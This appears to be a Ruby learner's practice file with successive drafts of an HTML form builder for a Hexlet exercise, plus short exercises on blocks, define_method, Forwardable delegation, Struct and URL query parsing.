        hash[name] = "name='#{name}' type='text' value='#{value}'"
      end
    end

    case options[:as]
    when :text
      input << '  <textarea '
      input << attributes.fetch(param_name)
      input << '>'
      input << @params.fetch(param_name)
      input << '</textarea>'
    else
      input << '  <input '
      input << attributes.fetch(param_name)
      options.map { |option_name, value| input << " #{option_name}='#{value}'" }
      input << '>'
    end
    puts input
  end
end


user = FormBuilder.new name: 'rob', job: 'hexlet', gender: 'm'

user.form do |f|
  f.input :job, class: 'www'
  f.input :name
  f.input :gender, as: :text, rows: 56, cols: 77
  f.input :job, as: :text
end





---




class ShoppingList
  def items &block
    array = []

    array << 'wow'
    instance_eval(&block)
    array << 'wow'
    pp array
  end

  def add options
    array = []

    options.each_with_object({}) do |(name, value), hash|
      array << value if name
    end

    puts array.join('  ')
  end
end

list = ShoppingList.new

list.add one: 'one 1', two: 'two 2'

puts

list.items do |item|
  item.add three: 'three 3', four: 'four 4'
  item.add five: 'five 5', six: 'six 6'
end










class ShoppingList
  attr_reader :params

  def self.items &block
    array = []

    array << "wow\n"
    array << yield_self(&block)
    array << "\nwow\n"
    array.join
  end

  def self.add options
    @params = []

    options.each_with_object({}) do |(name, value), hash|
      @params << "  #{value}" if name
    end

    pp @params
  end
end


list = ShoppingList.items do |item|
  item.add one: 'one 1', two: 'two 2'
  item.add five: 'five 5', six: 'six 6'
end

puts list
pp ShoppingList.items do |item|
  item.add ten: 'ten_10'
end





---




require 'active_support/all'

module HexletCode
  class Tag
    def self.build(name, **attributes)
      attributes = attributes.map { |attr, value| " #{attr}='#{value}'" }
      tag = []

      tag << "<#{name}"
      tag << attributes.join
      tag << '>' if !unpaired?(name)
      tag << yield if block_given?
      unpaired?(name) ? tag << '>' : tag << "</#{name}>"
      tag.join
    end

    def self.unpaired?(tag)
      unpaired = %w[ br hr img input meta area base col embed link param source track command keygen menuitem wbr ]
      unpaired.include?(tag) ? true : false
    end
  end
end

module HexletCode
  class << self
    def form_for struct, url={}, &block
      @params = struct.to_h
      form = []

      if url.key?(:url)
        form << "<form action='#{url.fetch(:url)}' method='post'>\n"
        puts instance_eval(&block)
        # form << yield_self(&block)
        form << "\n</form>"
      else
        form << "<form action='#' method='post'>\n"
        puts instance_eval(&block)
        # form << yield_self(&block)
        form << "\n</form>"
      end
    end

    def input param_name, **field_options
      @names = @params.each_with_object([]) do |(name, value), names|
        names << name if name == param_name
      end
      @names
    end
  end
end


User = Struct.new(:name, :job, :gender, keyword_init: true)
user = User.new(name: 'rob', job: 'hexlet', gender: 'm')



html = HexletCode.form_for user do |f|
  f.input :name
  f.input :job, as: :text
end

# <form action="#" method="post">
#   <input name="name" type="text" value="rob">
#   <textarea name="job" cols="20" rows="40">hexlet</textarea>
# </form>

puts html




html_2 = HexletCode.form_for user, url: '#' do |f|
  f.input :name, class: 'user-input'
  f.input :job
end

# <form action="#" method="post">
#   <input name="name" type="text" value="rob" class="user-input">
#   <input name="job" type="text" value="hexlet">
# </form>

puts html_2




html_3 = HexletCode.form_for user, url: '/users' do |f|
  f.input :job, as: :text, rows: 50, cols: 50
end

# <form action="#" method="post">
#   <textarea cols="50" rows="50" name="job">hexlet</textarea>
# </form>

puts html_3




html_4 = HexletCode.form_for user, url: '/users/path' do |f|
  f.input :name
  f.input :job, as: :text

  # f.input :age
end

# =>  `public_send': undefined method `age' for #<struct User id=nil, name=nil, job=nil> (NoMethodError)

puts html_4






---




require 'active_support/all'

module HexletCode
  autoload(:Tag, "./tag.rb")

  class << self
    def form_for(struct, url = {}, &block)
      @params = struct.to_h

      if url.key?(:url)
        puts "<form action='#{url.fetch(:url)}' method='post'>"
        instance_eval(&block)
        # yield_self if block_given?
        puts "</form>"
      else
        puts "<form action='#' method='post'>"
        instance_eval(&block)
        # yield_self if block_given?
        puts "</form>"
      end
    end

    def input(param_name, **field_options)
      @params.merge! field_options

      @input_attrs = @params.each_with_object({}) do |(name, value), hash|
        case field_options[:as]
        when :text
          hash[name] =
            "name='#{name}' cols='#{field_options.fetch(:cols, 20)}' rows='#{field_options.fetch(:rows, 40)}'"
        else
          hash[name] = "name='#{name}' type='text' value='#{value}'"
        end
      end
      field_constructor(param_name, **field_options)
    end

    def submit(*button_name)
      submit = []

      submit << "  <input type='submit'"
      submit << " name='#{button_name.present? ? button_name.join : 'Save'}'"
      submit << ">"
      puts submit.join
    end

    def field_constructor(param_name, **field_options)
      public_send(param_name) unless @params[param_name]
      field = []

      case field_options[:as]
      when :text
        field << label(param_name)
        field << "  <textarea "
        field << @input_attrs.fetch(param_name)
        field << ">"
        field << @params.fetch(param_name)
        field << "</textarea>"
      else
        field << label(param_name)
        field << "  <input "
        field << @input_attrs.fetch(param_name)
        field_options.map { |option_name, value| field << " #{option_name}='#{value}'" }
        field << ">"
      end
      puts field.join
    end

    def label(param_name)
      label = []

      label << "  <label for='#{param_name.to_s}'"
      label << param_name.to_s.capitalize
      label << "</label>\n"
      label.join
    end
  end
end


User = Struct.new(:name, :job, :gender, keyword_init: true)
user = User.new(name: 'rob', job: 'hexlet', gender: 'm')



HexletCode.form_for user do |f|
  f.input :name
  f.input :job, as: :text
end

# <form action="#" method="post">
#   <input name="name" type="text" value="rob">
#   <textarea name="job" cols="20" rows="40">hexlet</textarea>
# </form>



# HexletCode.form_for user, url: '#' do |f|
#   f.input :name, class: 'user-input'
#   f.input :job
# end
#
# # <form action="#" method="post">
# #   <input name="name" type="text" value="rob" class="user-input">
# #   <input name="job" type="text" value="hexlet">
# # </form>
#
#

# HexletCode.form_for user, url: '/users' do |f|
#   f.input :job, as: :text, rows: 50, cols: 50
# end
#
# # <form action="#" method="post">
# #   <textarea cols="50" rows="50" name="job">hexlet</textarea>
# # </form>



HexletCode.form_for user, url: '/users/path' do |f|
  f.input :name
  f.input :job, as: :text

  # f.input :age
end

# =>  `public_send': undefined method `age' for #<struct User id=nil, name=nil, job=nil> (NoMethodError)




HexletCode.form_for user do |f|
  f.input :name
  f.input :job
  f.submit
end

# <form action="#" method="post">
#   <label for="name">Name</label>
#   <input name="name" type="text" value="">
#   <label for="job">Job</label>
#   <input name="job" type="text" value="hexlet">
#   <input type="submit" value="Save">
# </form>



HexletCode.form_for user, url: '#' do |f|
  f.input :name
  f.input :job
  f.submit 'Wow'
end

# <form action="#" method="post">
#   <label for="name">Name</label>
#   <input name="name" type="text" value="">
#   <label for="job">Job</label>
#   <input name="job" type="text" value="hexlet">
#   <input type="submit" value="Wow">
# </form>





---




class FormBuilder
  def initialize params
    @params = params
  end

  def self.form_for struct, &block
    @struct = struct
    form = []

    form << "<form>\n"
    form << yield_self(&block)
    form << "\n</form>\n"
    form.join
  end

  def self.input param_name, *options
    param_name
  end
end


User = Struct.new(:name, :job, :gender, keyword_init: true)
user = User.new(name: 'rob', job: 'hexlet', gender: 'm')

html = FormBuilder.form_for user do |f|
  f.input :name
  f.input :job, as: :text
end

puts html






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

---------------
blocks, classes
---------------


3.times do
  p 'how'.upcase
end
puts

3.times do |f|
  p f.to_s
end
puts

def self.next_letter(letter)
  res = 'a' + letter
  p res
end

a = 'a'
a.upcase do |f|
  f.next_letter 'v'
end

next_letter a





---




class Car
  def big_car
    "This is the big car"
  end

  def small_car
    "This is the small car"
  end

  def doors
    "This car have a five doors" if self.big_car
  end
end

p big_car = Car.new
p big_car.big_car
p small_car = Car.new
p small_car.small_car
p big_car.doors
p small_car.doors




def outer(&block)
  if true
    wrapper = lambda {
      p 'Do something crazy in this wrapper'
      block.call # original block
    }
    inner(&wrapper)
  else
    inner(&passed_block)
  end
end

def inner(&block)
  p 'inner called'
  yield
end

outer do
  p 'inside block'
  sleep 1
end






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------------
define method
-------------


define_method("example") do |fixed, default = {}|
  puts fixed
  puts default
end

example('Hello', key: :value)
example('Hello')
puts

define_method(:my_method) do |foo, bar|
  bar ||= {}
  puts foo
  puts bar
end

my_method('Hello', key: :value)
my_method('Hello', nil)








----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

----------------------------------------
each with object, forwardable, uri, http
----------------------------------------


require 'forwardable'
require 'uri'

class Url

  extend Forwardable
  include Comparable

  def_delegators :@uri, :scheme, :host, :to_s, :query, :decode_www_form

  def initialize(uri)
    @uri = URI(uri)
  end

  def query_params
    if @uri.to_s.include?('?')
      # @params = uri.query.split('&').map { |el| el.split('=') }.each_with_object({}) do |item, hash|
      #             hash[item[0].to_sym] = item[1]
      #           end
      @params = @uri.query.split('&').each_with_object({}) do |item, hash|
        hash[item.split('=')[0].to_sym] = item.split('=')[1]
      end
    else
      @params = {}
    end
  end

  def query_param(key, value = nil)
    query_params
    @params.fetch(key.to_sym, value)
  end

  def <=>(other)
    @uri <=> other
  end
end

yandex_url = Url.new 'http://yandex.ru?key=value&key2=value2'
google_url = Url.new 'https://google.com:80?a=b&c=d&lala=value'

p yandex_url
p yandex_url.query
p yandex_url.query_params
p yandex_url == google_url # false






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-----------
forwardable
-----------


require 'forwardable'

class RecordCollection
  attr_accessor :records

  extend Forwardable

  # def_delegator :@records, :[], :record_number
  def_delegators :@records, :size, :<<, :map
end

r = RecordCollection.new

p r.records = [1, 2, 3]
# p r.record_number(0)   # => 1
p r.size               # => 3
p r << 4               # => [1, 2, 3, 4]
p r.map { |x| x * 2 }  # => [2, 4, 6, 8]





---




require 'forwardable'

class MyQueue

  CONST = 1

  extend Forwardable

  attr_reader :queue

  def initialize
    @queue = []
  end

  def_delegator :@queue, :push, :mypush
  def_delegator 'MyQueue::CONST', :to_i
end

q = MyQueue.new

puts q.mypush 42
puts q.push 42
puts q.queue    #=> [42]
# puts q.push 23  #=> NoMethodError
puts q.to_i





---




require 'forwardable'

User = Struct.new(:first_name, :last_name)

class UserDecorator
  extend Forwardable

  def_delegators :@user, :first_name, :last_name

  def initialize(user)
    @user = user
  end

  def full_name
    "#{first_name} #{last_name}"
  end
end

decorated_user = UserDecorator.new(User.new("John", "Doe"))
decorated_user_2 = UserDecorator.new(User.new('Gor', 'Khachatryan'))

puts decorated_user.first_name
puts decorated_user.last_name
puts decorated_user.full_name
puts
puts decorated_user_2.first_name
puts decorated_user_2.last_name
puts decorated_user_2.full_name





---




require 'forwardable'

User = Struct.new(:first_name, :last_name)

class UserDecorator
  extend Forwardable

  def_delegator :@user, :first_name, :personal_name
  def_delegator :@user, :last_name, :family_name

  def initialize(user)
    @user = user
  end

  def full_name
    "#{personal_name} #{family_name}"
  end
end

decorated_user = UserDecorator.new(User.new("John", "Doe"))
# decorated_user.first_name
puts decorated_user.personal_name





---




require 'forwardable'

class RecordCollection
  attr_accessor :records

  extend Forwardable

  def_delegator :@records, :[], :record_number
end

r = RecordCollection.new

p r.records = [4,5,6]
puts
p r.record_number(0)






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


@h = {"key"=>"value", "key2"=>"value2"}

def returner(key, value = nil)
  @h.fetch(key.to_s, value)
end

puts returner(:key).inspect
puts returner(:key2, 'lala').inspect
puts returner(:new, 'ehu').inspect
puts returner(:lalala).inspect
puts returner(:lalala, 'default').inspect





---




Bus = Struct.new(:color, :doors, keyword_init: true)
bus = Bus.new(color: 'Green', doors: 3) do |c|
  pp c.color
  pp c.doors
end
pp bus
puts "color: #{bus.color}\ndoors: #{bus.doors}"





---




Customer = Struct.new(:name, :address) do
  def greeting
    puts self
  end
end

dave = Customer.new("Dave", "123 Main")

Customer.new("Martin", "Madisson street 8").greeting do |attr|
  pp attr.greeting
end





---




p ({key: 'value'}).eql?({'key' => 'value'})
p ({key: 'value'}).eql?({key: 'value'})





---




module HexletCode
  class Tag
    class << self
      def build(name, **attributes)
        attributes = attributes.map { |attr, value| " #{attr}='#{value}'" }
        tag = []

        tag << "<#{name}"
        tag << attributes.join
        tag << ">" unless unpaired?(name)
        tag << yield if block_given?
        tag << (unpaired?(name) ? ">" : "</#{name}>")
        tag.join
      end

      def unpaired?(tag)
        unpaired = %w[ br hr img input meta area base col embed link param source track command keygen menuitem wbr ]
        unpaired.include?(tag) ? true : false
      end
    end
  end
end

pp HexletCode::Tag.build('br')
pp HexletCode::Tag.build('img', src: 'path/to/image')
pp HexletCode::Tag.build('input', type: 'submit', value: 'Save')
pp HexletCode::Tag.build('label') { 'Email' }
pp HexletCode::Tag.build('label', for: 'email') { 'Email' }
pp HexletCode::Tag.build('div')










----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



























































